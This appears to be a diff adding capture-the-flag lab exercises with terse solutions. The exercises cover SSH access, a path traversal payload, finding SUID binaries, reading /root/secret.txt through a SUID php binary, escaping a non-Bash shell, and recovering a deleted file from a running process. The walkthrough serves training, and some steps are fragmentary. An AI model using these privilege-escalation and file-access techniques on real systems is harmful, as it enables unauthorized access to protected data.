@@ -7,3 +7,38 @@ On the server, in the user’s home directory, a file secret.txt was placed whic
 ssh -l alice 10.0.42.158 "ls"
 ssh -l alice 10.0.42.158 "cat secret.txt"
 ssh -l alice 10.0.42.158 -t "sh -i" [interactive mode]
+
+Access to files in the /root folder:
+On the server there is a file secret.txt in the folder /root whose owner is the root account. The task is to read the content of the file which includes the solution. To solve this exercise, you can use one of the user’s home directory files.
+.file
+/root/secret.txt
+
+
+Access to files belonging to the root user:
+On the server there is a file secret.txt in the folder /root whose owner is root. The task is to read the content of the file with the solution.
+To solve the task you can use one of the files in the user’s home directory which allows to read files from the folder /tmp and is prone to a Path Traversal attack.
+./file
+../root/secret.txt
+
+User privilege escalation:
+On the server there is a file secret.txt in the folder /root whose owner is root. The task is to read the content of the file including the solution.
+In order to solve the task, use one of the programs with SUID permissions to escalate privileges to the root account.
+find / -perm /6000 2>/dev/null
+php7.4 -f /root/secret.txt
+
+Shell other than Bash:
+After logging in through SSH you need to log in to the account of user bob, however, after logging in to bob's account, shell other than Bash gets launched.
+Identify what shell this is, exit it to Bash shell, and read the file from the home directory of user bob with the task solution.
+cat /etc/passwd
+--
+cd /.ssh
+ssh -l bob localhost -i bob_key.pem
+v
+:e secret.txt
+
+Deleted file:
+In your home directory there is a program file.py (written in Python) which reads the file with the solution to the task. Unfortunately, it has been deleted, but it is still running in the background.
+Your task is to read the content of the file containing the task solution.
+ps aux
+ps -x
+cat ./3
